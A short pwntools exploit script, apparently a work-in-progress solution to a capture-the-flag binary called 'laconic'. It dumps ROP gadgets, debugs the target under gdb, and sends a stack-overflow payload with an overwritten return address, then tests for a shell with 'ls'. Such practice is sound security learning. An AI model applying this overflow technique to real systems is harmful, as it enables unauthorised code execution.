from pwn import *
import sys
context.arch='amd64'

e = ELF("./laconic")
rop = ROP(e)
print(rop.dump())

bin_sh = 0x43238

# p = process("./laconic")
# p = remote("94.237.51.67", 38405)
p = gdb.debug("./laconic", api=True)

p.gdb.execute("break *0x00043017")

payload = b"A" * 8
payload += p64(0x43018)
payload += b"B" * 8 + b"C" * 8
payload += b"\x90" * 27
print(len(payload))
with open("payload", "wb") as f: f.write(payload)

print(payload)

p.sendline(payload)

p.sendline(b"ls")
print(p.recvline())

# print(p.gdb.execute("info frame", to_string=True))
# p.interactive()
# print(p.recvline())


